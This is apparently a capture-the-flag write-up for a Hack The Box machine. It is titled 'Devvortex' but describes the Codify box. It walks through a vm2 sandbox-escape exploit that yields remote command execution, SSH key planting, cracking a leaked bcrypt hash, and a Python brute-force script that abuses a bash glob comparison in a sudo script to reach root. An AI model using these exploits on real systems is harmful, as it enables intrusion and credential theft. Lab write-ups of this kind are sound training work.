# Solver for Devvortex

For my opinion to privilage escalation to root is a bit guessy because the combination can be uppercase or lowercase and use symbol, so it will be a long time to bruteforce it if the password is strong

## Recon

### Check library/framework/cms version that the server use

The Server maybe using <https://github.com/patriksimek/vm2/releases/tag/3.9.16> , you can see in the about page <http://codify.htb/about>

### Check CVE/Vuln

In the security tab of github, VM2 Was identify vuln for RCE Bypass ( previously if we didnt use this bypass we cant RCE using node.js ) <https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244>

```js
const {VM} = require("vm2");
const vm = new VM();

cmd = 'urpayloadcommandinjection'
const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
`

console.log(vm.run(code));
```

alright we already craft the exploit, lets go into the exploit section

## Exploit

### Check if the exploit successfully

Now we put the payload 'id' to get the username of the user currently and we got output 'svc', alright and we know that the port 22 (ssh) is open so we can put our ssh public key in there and gaining ssh access

### Gaining SSH Access

Now we go to our machines and copy our ssh public key, in mine is cat ~/.ssh/id_rsa.pub , if you dont have you can generate a new one. then copy and put in the server, with payload

```sh
mkdir ~/.ssh; echo "yourpublickeypastehere" > ~/.ssh/authorized_keys;
```

### Getting Access to user joshua

We go to /var/www/ and we see all directory, one of the directory contains .db file. that is contacts , we strings the db and we got joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2 . Now we can crack the pass using john

### Crack The Pass of joshua

we can crack using this command and we got the password using rockyou lists

## Privilage Escalation TO ROOT

Now we escalate with sudo -l now we can see if the program call backup db call. and its the sh file its vuln to bruteforcing the password /opt/scripts/mysql-backup.sh

```sh
DB_USER="root" 
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then     # -- This Vuln because this check contains not validated full the strings. only if contains will pass so we can do bruteforce in here 
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```

we can do bruteforce with this script

```py
import subprocess
import string

combination = string.ascii_letters + string.digits
password = ""
while True:
    for char in combination:
        command = f"echo '{password+char}*' | sudo /opt/scripts/mysql-backup.sh"
        proc = subprocess.run(command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if "Password confirmed!" in proc.stdout:
            password += char
            print(password)
            break
    
print(password)
```

 we obtain the password and go to the /root and obtain the flag
